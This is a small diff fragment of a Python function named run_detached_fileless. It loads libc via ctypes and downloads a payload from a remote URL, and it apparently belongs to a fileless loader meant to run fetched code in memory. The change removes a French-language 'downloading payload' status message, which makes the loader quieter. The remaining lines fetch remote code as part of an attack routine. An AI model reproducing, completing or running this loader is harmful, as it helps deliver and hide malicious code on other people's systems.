@@ -13,7 +13,6 @@ def run_detached_fileless():
     libc = ctypes.CDLL("libc.so.6")
 
     try:
-        print(f"[*] Téléchargement du payload...")
         with urllib.request.urlopen(URL_PAYLOAD) as response:
             payload = response.read()
 
